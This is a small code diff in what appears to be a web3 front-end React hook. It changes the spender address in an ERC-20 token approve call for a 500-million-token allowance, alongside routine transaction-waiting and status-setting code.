@@ -165,7 +165,7 @@ const Contractshook = () => {
     setIsMining("")
     const waitfortx = await provider.waitForTransaction(tx.hash)
     setIsMining("none")
-    const tx2 = await evm.approve("0xFd32D87F7bb527c98f95E0cb5825C51B6dE25552",ethers.utils.parseUnits("500000000", 18))
+    const tx2 = await evm.approve("0x667c26ce26960eE07f774F361c2F899D2CbA69BD",ethers.utils.parseUnits("500000000", 18))
     console.log(tx2.hash)
     setIsMining("")
     const waitfortx2 = await provider.waitForTransaction(tx2.hash)
